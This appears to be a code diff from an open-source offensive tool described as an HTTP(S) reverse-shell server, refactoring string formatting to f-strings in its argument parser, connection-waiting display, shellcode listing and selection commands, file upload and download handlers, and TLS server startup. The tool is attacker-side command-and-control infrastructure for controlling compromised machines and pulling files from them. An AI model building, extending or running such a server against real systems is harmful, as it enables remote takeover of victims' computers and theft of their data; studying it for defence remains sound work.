@@ -86,35 +86,35 @@ app.config['SECRET_KEY'] = hexlify(os.urandom(16)) # you can change that to some
 errors = Blueprint('errors', __name__)
 
 def console():
-    parser = ArgumentParser(description="{}server.py:{} An HTTP(S) reverse-shell server with advanced features.".format('\033[1m', '\033[0m'),
+    parser = ArgumentParser(description=f"{B}server.py:{RA} An HTTP(S) reverse-shell server with advanced features.", 
                 formatter_class=RawTextHelpFormatter)
-    parser._optionals.title = "{}arguments{}".format(B, RA)
+    parser._optionals.title = f"{B}arguments{RA}"
     parser.add_argument('-s', "--server",
                 choices=['flask', 'tornado'],
                 default='flask', metavar='',
-                help="Specify the HTTP(S) server to use (default: {}flask{}).".format(C, RA))
+                help=f"Specify the HTTP(S) server to use (default: {C}flask{RA}).")
     parser.add_argument('-c', "--client",
                 type=validateIP,
                 default=None, metavar='',
                 help="Accept connections only from the specified client/IP.")
     parser.add_argument("--host",
                 default='0.0.0.0', metavar='',
-                help="Specify the IP to use (default: {}0.0.0.0{}).".format(C, RA))
+                help=f"Specify the IP to use (default: {C}0.0.0.0{RA}).")
     parser.add_argument('-p', "--port",
                 type=validatePort,
                 default=5000, metavar='',
-                help="Specify a port to use (default: {}5000{}).".format(C, RA))
+                help=f"Specify a port to use (default: {C}5000{RA}).")
     parser.add_argument("--http",
                 action="store_true",
                 help="Disable TLS and use HTTP instead.")
     parser.add_argument("--cert",
                 type=ValidateFile,
                 metavar='',
-                help='Specify a certificate to use (default: {}None{}).'.format(C, RA))
+                help=f'Specify a certificate to use (default: {C}None{RA}).')
     parser.add_argument("--key",
                 type=ValidateFile,
                 metavar='',
-                help='Specify the corresponding private key to use (default: {}None{}).'.format(C, RA))
+                help=f'Specify the corresponding private key to use (default: {C}None{RA}).')
     args = parser.parse_args()
     return args
 
@@ -138,7 +138,7 @@ def rotate(progress):
     global c1, c2
     msg = list('waiting for a connection...')
     msg[c1] = msg[c1].capitalize()
-    custom_print('{} '.format(C+progress[c2]+RA) + ''.join(msg))
+    custom_print(f'{C+progress[c2]+RA} ' + ''.join(msg))
     c1 += 1
     c2 += 1
     if c1 == len(msg)-3: c1 = 0
@@ -146,11 +146,11 @@ def rotate(progress):
 
 def ValidateFile(file):
     if not os.path.isfile(file):
-        raise ArgumentTypeError('[x] File does not exist')
+        raise ArgumentTypeError(f'{R+file+RA} does not exist')
     if os.access(file, os.R_OK):
         return file
     else:
-        raise ArgumentTypeError('[x] File is not readable')
+        raise ArgumentTypeError(f'{R+file+RA} is not readable')
 
 def validatePort(port):
     if isinstance(int(port), int): # python3
@@ -214,12 +214,12 @@ def limit_remote_addr():
 def valid_file(file):
     """validate that the file exists and is readable"""
     if not os.path.isfile(file):
-        app.logger.error('{} does not exist!'.format(file))
+        app.logger.error(f'{file} does not exist!')
         return False
     if os.access(file, os.R_OK):
         return True
     else:
-        app.logger.error('{} is not readable'.format(file))
+        app.logger.error(f'{file} is not readable')
         return False
 
 @app.route('/')
@@ -270,9 +270,9 @@ def handleGET():
                 reload(utils)
                 if utils.shellcodes[1][0]:
                     for k,v in utils.shellcodes.items():
-                        print("{} => {}".format(k, v[0]))
+                        print(f"{B+str(k)+RA} => {v[0]}")
                 else:
-                    print("[x] There are no shellcodes available.")
+                    print(f"[{B}ERROR{RA}] There are no shellcodes available.")
                 return emptyresponse
             elif set_shellcode.match(cmd):
                 shc_id = int(set_shellcode.search(cmd).group(1))
@@ -283,10 +283,10 @@ def handleGET():
                             shc_id=shc_id)
                         )
                     else:
-                        print("[x] There is no shellcode with id: {}".format(shc_id))
+                        print(f"[x] There is no shellcode with id: {shc_id}")
                         return emptyresponse
                 except KeyError:
-                    print("[x] There is no shellcode with id: {}".format(shc_id))
+                    print(f"[x] There is no shellcode with id: {shc_id}")
                     return emptyresponse
             elif exit_cmd.match(cmd):
                 cmd_contents = cmd
@@ -310,11 +310,11 @@ def handlePOST():
             if request.headers.get('Action') == 'download':
                 with open(filename, 'wb') as w:
                     w.write(bdec(request.data))
-                print('{} successfully downloaded!'.format(filename))
+                print(f'{filename} successfully downloaded!')
             else:
-                print('{} successfully uploaded!'.format(filename))
+                print(f'{filename} successfully uploaded!')
         elif request.headers.get('Shellcode_id'):
-            slowprint("[+] Shellcode successfully set to: {}".format(Y+utils.shellcodes[int(request.headers.get('Shellcode_id'))][0])+RA)
+            slowprint(f"[+] Shellcode successfully set to: {Y+utils.shellcodes[int(request.headers.get('Shellcode_id'))][0]}{RA}")
         else:
             print(request.data[:-1].decode())
     return emptyresponse
@@ -386,18 +386,18 @@ if __name__ == '__main__':
                 app.run(host=args.host, port=args.port, debug=False, ssl_context='adhoc')
     else:
         if args.http:
-            slowprint("* Serving on: {}http://{}:{}{}".format(B+BL, args.host, args.port, RA))
+            slowprint(f"* Serving on: {B+BL}http://{args.host}:{args.port}{RA}")
             http_server = HTTPServer(WSGIContainer(app))
         elif args.cert and args.key:
-            slowprint("* Serving on: {}https://{}:{}{}".format(B+BL, args.host, args.port, RA))
+            slowprint(f"* Serving on: {B+BL}https://{args.host}:{args.port}{RA}")
             Talisman(app)
             ssl_ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
             ssl_ctx.load_cert_chain(args.cert, args.key)
             http_server = HTTPServer(WSGIContainer(app), ssl_options=ssl_ctx)
         else:
-            print("{}ERROR:{} Both cert and key must be specified\nor disable TLS with --http option.".format(B, RA))
+            print(f"{B}ERROR:{RA} Both cert and key must be specified\nor disable TLS with --http option.")
             sys.exit(0)
-        slowprint("* {}Server:{} Tornado-WSGI".format(B, RA))
+        slowprint(f"* {B}Server:{RA} Tornado-WSGI")
         startloading()
         try:
             http_server.listen(args.port, address=args.host)
